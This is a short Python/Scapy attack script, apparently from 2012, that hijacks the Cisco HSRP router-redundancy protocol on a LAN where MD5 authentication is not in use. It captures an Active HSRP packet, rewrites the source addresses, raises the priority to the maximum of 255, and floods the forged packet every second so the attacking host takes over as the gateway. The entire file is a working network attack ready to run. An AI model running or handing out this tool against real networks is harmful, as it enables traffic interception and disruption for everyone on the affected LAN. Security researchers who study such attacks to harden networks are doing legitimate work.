#!/usr/bin/env python

# $Id: 20121212$
# $Date: 2012-12-12 10:23:20$
# $Author: Marek Lukaszuk$

# This takes over any HSRP communication in LAN
# that is _not_ protected by MD5 auth

from scapy.all import *
import time
import sys

# tweak variables
IPv4Src = "10.0.0.10"
IPv6Src = "2001::ff"
EthSrc = "00:aa:bb:cc:dd:ee"
interface = "tap2"
HSRPpri = 255

# scapy verbose toggle
conf.verb = 0

# Cisco Hot Standby Router Protocol
#    Group State TLV: Type=1 Len=40
#        Version: 2
#        Op Code: Hello (0)
#        State: Active (6)
#        IP Ver.: IPv4 (4)
#        Group: 0
#        Identifier: c2:04:1a:18:00:00 (c2:04:1a:18:00:00)
#        Priority: 100
#        Hellotime: Default (3000)
#        Holdtime: Default (10000)
#        Virtual IP Address: 10.0.0.1 (10.0.0.1)
#    Text Authentication TLV: Type=3 Len=8
#        Authentication Data: Default (cisco)
#
#0000  01 00 5e 00 00 66 00 aa bb cc dd ee 08 00 45 c0   ..^..f........E.
#0010  00 50 00 00 00 00 01 11 ce 6d 0a 00 00 0a e0 00   .P.......m......
#0020  00 66 07 c1 07 c1 00 3c 97 36 01 28 02 00 06 04   .f.....<.6.(....
#0030  00 00 c2 04 1a 18 00 00 00 00 00 64 00 00 0b b8   ...........d....
#0040  00 00 27 10 0a 00 00 01 00 ff 02 00 00 00 00 00   ..'.............
#0050  00 00 00 03 03 08 63 69 73 63 6f 00 00 00         ......cisco...

hsrpv2 = "\x02"
hsrpv2active = "\x06"

# this function checks if the HSRP packet is an Active packet
def hsrpactive(pkt):
  if pkt.haslayer(HSRP):
    if pkt[HSRP].state == 16: # HSRPv1
      return True
    if str(pkt[HSRP])[2] == hsrpv2 and str(pkt[HSRP])[4] == hsrpv2active: # HSRPv2
      return True
  return False

print "[+] sniffing for HSRP Active packet"

# lets capture one Active HSRP status packet
p = sniff(iface = interface, count = 1, filter = "udp and port 1985", lfilter = lambda x: hsrpactive(x))[0]
print "[+] got one packet"

# now lets modify it
p[Ether].src = EthSrc

# set some values to None to
# recalculate them automatically
if p.haslayer(IP):
  p[IP].len = None
  p[IP].chksum = None
  p[IP].src = IPv4Src
elif p.haslayer(IPv6): # TODO - test IPv6
  p[IPv6].len = None
  p[IPv6].chksum = None
  p[IPv6].src = IPv6Src

p[UDP].len = None
p[UDP].chksum = None

# lets increase priority
if str(p[HSRP])[2] == hsrpv2 and str(p[HSRP])[4] == hsrpv2active:
  data = str(p[HSRP])
  # print data.encode('hex')

  off = 0
  while True:

    if off >= len(data):
      break

    if data[off] == "\x01": # HSRPv2 TLV for group
      data = data[:off+16]+chr(HSRPpri)+data[off+17:]

    off += ord(data[off+1]) + 2
 
  # print data.encode('hex')
  p[UDP].payload = data.decode('string_escape')
else:
  p[HSRP].priority = chr(HSRPpri)

print "[+] packet modified, sending"

# and lets flood the LAN
while True:
  sendp(p,iface = interface)
  sys.stdout.write(".")
  sys.stdout.flush()
  time.sleep(1) # this could be tweaked

